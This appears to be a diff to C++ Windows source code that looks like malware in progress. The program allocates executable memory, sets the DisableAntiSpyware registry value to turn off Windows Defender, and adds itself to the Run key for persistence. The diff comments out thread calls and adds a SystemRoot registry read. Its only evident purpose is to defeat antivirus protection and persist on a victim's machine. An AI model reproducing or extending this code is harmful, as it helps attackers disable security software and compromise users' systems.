@@ -14,7 +14,7 @@
 #include <winsock.h>
 using std::ostringstream;
 using std::ends;
-#pragma comment(lib,"ws2_32.lib")
+#pragma comment(lib, "ws2_32.lib")
 
 int CreateSocket()
 {
@@ -115,8 +115,8 @@ int main()
 
     address = VirtualAlloc(NULL, 11, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
-    CreateThread(NULL, NULL, NULL, NULL, NULL, NULL);
-    CreateThread(NULL, NULL, NULL, NULL, NULL, NULL);
+    //CreateThread(NULL, NULL, NULL, NULL, NULL, NULL);
+    //CreateThread(NULL, NULL, NULL, NULL, NULL, NULL);
 
     HKEY key;
     HKEY new_key;
@@ -125,11 +125,17 @@ int main()
     RegSetValueExA(key, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
     RegCreateKeyExA(key, "Real-Time Protection", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &new_key, 0);
 
+
+
     // adding calling process to run
     HKEY hOpened;
     char pPath[100];
     GetModuleFileNameA(0, pPath, 100);
     RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hOpened);
+
+    char value[255];
+    DWORD BufferSize = 8192;
+    RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "SystemRoot", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
 
     int zero = CreateSocket();
 }
